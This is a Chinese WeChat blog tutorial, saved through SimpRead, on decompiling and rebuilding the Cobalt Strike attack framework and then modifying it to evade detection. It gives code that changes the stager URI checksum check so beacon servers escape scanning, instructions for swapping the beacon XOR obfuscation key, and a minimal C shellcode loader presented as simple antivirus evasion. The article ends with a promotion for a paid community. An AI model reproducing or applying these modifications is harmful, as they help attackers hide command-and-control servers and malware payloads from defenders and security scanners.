> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/sPrc8K43O4j53vJ3E_LYwA)

1、CobaltStrike 反编译

首先我们将 IEDA 中的 java-decompiler.jar 拿出来，一般在 / plugins/java-decompiler.jar/lib / 里面。然后新建两个文件夹来存放我们反编译的文件。其中 cs_bin 里面存放未反编译的文件。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Ufiap0KIIbJuDVxacDXCeQ4Yw86sqfWjjaPbprMAzeXJIiakkYbUZts4OHCpdib19CqZ02h04htXRZA/640?wx_fmt=png)

然后提取其中的 consoledecompiler，路径一般如下：

```
org/jetbrains/java/decompiler/main/decompiler/
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Ufiap0KIIbJuDVxacDXCeQ4vFGIIENGuoFW3RN8iaJ3YDKia3nzMDmbcpVGDg8ibyeCBvCzDNWT5KHfw/640?wx_fmt=png)

然后将斜杠改成点，得到：

```
org.jetbrains.java.decompiler.main.decompiler.consoledecompiler
```

使用方法如下：

```
java -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler
```

会报错，提示缺少主类。我们需要跟上 - dsg=true 参数以及需要反编译的文件和反编译后的目录。（图配错了）

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Ufiap0KIIbJuDVxacDXCeQ4VfibcJMrMbb8BBjo9F8Ct4YSVZ0zMrOv5uezVzZFWezLAdqIAaO9FLw/640?wx_fmt=png)

```
java -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dsg=true cs_bin/cobaltstrike.jar cs_src
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Ufiap0KIIbJuDVxacDXCeQ4aFLNOXEBrEvhKts4BEMToJqChr0xzm7OIxKypqXMHoMKWeZBt1cicoQ/640?wx_fmt=png)

然后解压生成的文件，得到后缀为. java 的文件。便可以直接导入到 idea 了。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Ufiap0KIIbJuDVxacDXCeQ489AFiaJjFE5ruKrotfQx11OQBYnvB2fGjficKEyyticmDicibVVnUbF0mvg/640?wx_fmt=png)

打开 idea 新建项目，一路 next

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Ufiap0KIIbJuDVxacDXCeQ4wDWWG5qbeaiaGKbhzYgFuEYo84o0L2CwrO7a1j2qiblMPd51Ut69KbWQ/640?wx_fmt=png)

完成后新建一个 xx_src 与一个 lib 目录

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Ufiap0KIIbJuDVxacDXCeQ4B6CHRTwX4phDFcIIuNkLRFso1JPHqH7HoicrspPIU7dSVVnG9P2L0Pg/640?wx_fmt=png)

然后复制刚刚解压的文件到新建的 src 目录中。未反编译的放入 lib 中

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Ufiap0KIIbJuDVxacDXCeQ4SHAvcHibsufY4p8ribxicfTXC4ibibhDlYH3TMsFEgxEbs2DySoHlJMNALw/640?wx_fmt=png)

然后选择 file 里面的 project Structure 中的模块。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Ufiap0KIIbJuDVxacDXCeQ4WopqR5ds2ZVQ1NDaeIib4Ogh1JV3JjoI6tLy8BW0RSX5vuKrh8m4Dfw/640?wx_fmt=png)

点击加号，选择 lib 目录下面的文件，点击 apply.。确保是 Compile

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Ufiap0KIIbJuDVxacDXCeQ4CS1RcD6LY4BuV81FerZOLDO4iaicSaQe7DAGicCe3oB3VTB85vJ1vPN1g/640?wx_fmt=png)

然后依次选择 Artifacts--->jar--->from modules with dependencies 去新建一个 Main Class

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Ufiap0KIIbJuDVxacDXCeQ4oVeTnicWMrhziapDMo9Qjb92BjXeygYm6yq7I2rwIk2JrsMq2ajq20hA/640?wx_fmt=png)

这个名字可以在 lib---->cs.jar---->meta-inf---->menifest.mf 中找到

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Ufiap0KIIbJuDVxacDXCeQ4wsyPkQicXicfwoeA60anLwRVWqBEK1tFicavFFZ0AqWVQXofPic1cD8mAg/640?wx_fmt=png)

然后找到反编译完的 aggressor 中，找到主类，右键选择 refactor ----> copy

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Ufiap0KIIbJuDVxacDXCeQ4RpsKXreIApa1oBk1Xk6olKrMz31WVPtld1lZQouZUBm3ia7TW6HmmTg/640?wx_fmt=png)

然后下选择文件夹，选择刚刚的 src 文件夹，并新建 aggressor 文件夹。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Ufiap0KIIbJuDVxacDXCeQ4yuWAa4hb0eW0ZtRk2UecGK2CgpYKYFDbujVRfZtZmQ2MAQeTDUp2dQ/640?wx_fmt=png)

效果如下：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Ufiap0KIIbJuDVxacDXCeQ47V2q7Dibc4YBNGFRJpx6L1mIFhcWoyNLiaib1BZDZV40Hm159sVfhaIWw/640?wx_fmt=png)

添加一行代码，测试：

```
JOptionPane.showMessageDialog(null,"hello world!!!");
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Ufiap0KIIbJuDVxacDXCeQ44gN6MeAwKdlyMgfbEQiaZM4fRBD2Kb6MV590S5ENBBEMPuhzrLklINA/640?wx_fmt=png)

现在所需要的修改就完成了，后面需要修改什么文件，都可以以 copy 的方式去复制、修改了。然后 build 测试：Build----->Build Artifacts----->Build，out 文件夹就可以看到了。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Ufiap0KIIbJuDVxacDXCeQ4EpmwTc86WSWfAmibrRMpyWYNkkcjuCyXBLNAXo5cbHialn8yOdH74LOw/640?wx_fmt=png)

然后添加一个 jar 配置，然后把刚刚的 jar 添加到路径中

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Ufiap0KIIbJuDVxacDXCeQ4uOibWxOx0FWQVjfvkxFicTOibcibIVHGz1CaVovzRWXk68JYXkia0waFkzQ/640?wx_fmt=png)

添加配置：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Ufiap0KIIbJuDVxacDXCeQ4gw5Ypsokyf7XZzlKnfqqMB9cvRxCLybTnmicTS0mdkIhrHkxtkMRJSg/640?wx_fmt=png)

如果打包有问题，可以把下面的文件复制过去

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Ufiap0KIIbJuDVxacDXCeQ4ocJp3xXibg6l6193qJNhFiaX26afZcB9Z8E8iblAhfhMDEzhywdq7fFJQ/640?wx_fmt=png)

2、CobaltStrike 特征修改

1、修改 stager 防止被扫：修改位置如下：

```
cloudstrike/webserver.class
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Ufiap0KIIbJuDVxacDXCeQ4eSqpQZ3ZK7b3N0fJNZZibicDYhovkwR1AfdRJulV4D0USTuUghR6icibJg/640?wx_fmt=png)

主要是 isStager 函数，只要不是 92 或者 93 就行。这里首先需要修改 checksum8，将其返回值改为：

```
return sum
```

随机生成文件，然后调用算法，得到需要的值。

```
public class test {
    public static long checksum8(String text) {
        if (text.length() < 4) {
            return 0L;
        } else {
            text = text.replace("/", "");
            long sum = 0L;

            for(int x = 0; x < text.length(); ++x) {
                sum += (long)text.charAt(x);
            }

            return sum ;
        }
    }
    public static void main(String []args) {
        String key = "8626fe7dcd8d412a80d0b3f0e36afd4a.jpg";
        long flag = checksum8(key);
        System.out.println(flag);
    }
}
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Ufiap0KIIbJuDVxacDXCeQ4icU1IibEicFAeficXiaOcr0GE9DJmqKwgAFQa0Q66OBUph8z2V9ibawqvUaw/640?wx_fmt=png)

然后将该值放入：

```
public static boolean isStager(String uri) {
   return checksum8(uri) == 2747L;
}
```

并修改

```
common/CommonUtils中的
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Ufiap0KIIbJuDVxacDXCeQ4eBIG2qaN48O3S8yy7Il4oKuuXVUmw2KRe6iaupHS8x52xR5vAAnvZ9Q/640?wx_fmt=png)

将返回值改成我们刚刚修改的文件名：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Ufiap0KIIbJuDVxacDXCeQ4hUK9R44ab3QMjJ1P3J6r6icVDEXCr0TYjKO25JZYtCyECjIfGTeH9rA/640?wx_fmt=png)

x64 同理修改。或者使用之前的师傅们改好的东西，直接把

```
beacon/BeaconPayload.java
```

复制过来。然后修改

```
public static byte[] beacon_obfuscate(byte[] var0) {
   byte[] var1 = new byte[var0.length];

   for(int var2 = 0; var2 < var0.length; ++var2) {
      var1[var2] = (byte)(var0[var2] ^ );
   }

   return var1;
}
```

的异或值，再将所有的 dll 更改后放入即可。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Ufiap0KIIbJuDVxacDXCeQ4urdYXNL8dQBfYzCgSoM4mwWWIicQGuL3Yicvz9ozkOnuKVWzslyo0mPQ/640?wx_fmt=png)

2、修改源码。简单免杀：

shellcode 生成的路径为：

```
/aggressor/dialogs/PayloadGeneratorDialog.java
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Ufiap0KIIbJuDVxacDXCeQ4AjjWWWlpjuYo4tCLvTD4ryaKOs7vDSNb3y071T2gfXJTdX52uMicY2g/640?wx_fmt=png)

以Ｃ为例，若需修改，直接选择 ToC, 跳转就可，位置在：

```
encoders/Transforms.java
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Ufiap0KIIbJuDVxacDXCeQ4EJ05lhdibWQO7F1W80UiaEA3tSf7EeAYnbKiaRKx7wlyvzEfVUvQP2P0g/640?wx_fmt=png)

我们便可以直接拿过了我们的加载器来使用

```
#include <windows.h>
#include <stdio.h>
unsigned char buf[] ="";
void main(){   
    ((void(WINAPI*)(void))&buf)();
}
```

此时生成的. c 文件如下：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08Ufiap0KIIbJuDVxacDXCeQ46umxZeXrVuJL8ZpWuDq2mAxrSbE6tvic11JGibfd2RWLIvVr7jQyYqvg/640?wx_fmt=png)

参考文章：  

https://github.com/qigpig/bypass-beacon-config-scan

https://mp.weixin.qq.com/s?__biz=MzU2NTc2MjAyNg==&mid=2247484689&idx=1&sn=8cf9c031f3d926c155ee5c018941b416&chksm=fcb78794cbc00e82e7a44f89e796be2ef551a792946992dd540d31891848dca84398de16b85e&mpshare=1&scene=23&srcid=1205W5UXcmMgANYQEPoqFrtI&sharer_sharetime=1607133873287&sharer_shareid=ff83fe2fe7db7fcd8a1fcbc183d841c4#rd

星球营造良好的技术交流氛围，一直秉承着有问有答才是真正的技术交流，如果你喜欢分享，喜欢学习，那么请加入我们吧  

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtqkuTplNsf0PWREmv4NlgBM0JCEP1HUInackWmZheMiaUr3yqYQsuvtqMurqdfpjzUSDcs5B7HicKA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtqkuTplNsf0PWREmv4NlgBicOicWibIolZyEuIjkxNwnTR2VgYKA7x1m68mLZl5yTiaHiaTP4tdSVQNtA/640?wx_fmt=png)

老哥们纷纷放出大招，牛逼 class  

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtqkuTplNsf0PWREmv4NlgB4ECxHxujzTfAZwprckQC6iavj9Mccn0GmYYeoPJOrzXGIX4vSVKsKmQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtqkuTplNsf0PWREmv4NlgBVku9M3wmC5WDG4HMHIicFGiaTtzMhZjBheDialRNYAOcog7n4GkI6qibpg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtqkuTplNsf0PWREmv4NlgBiaLt0fe5PzasNs5GibsgwVQMqK35hnEE2XV5vWajpDyuBzOUsNeGib9BA/640?wx_fmt=png)

欢迎加入我们，学习技术，分享技术，解决难题  

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtqkuTplNsf0PWREmv4NlgBjzsNibIy0mNtQ94iaBldm2ZwgZJBfiauCmoye0hXYndakYayehPcvaAhw/640?wx_fmt=png)

     ▼

更多精彩推荐，请关注我们

▼

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08XZjHeWkA6jN4ScHYyWRlpHPPgib1gYwMYGnDWRCQLbibiabBTc7Nch96m7jwN4PO4178phshVicWjiaeA/640?wx_fmt=png)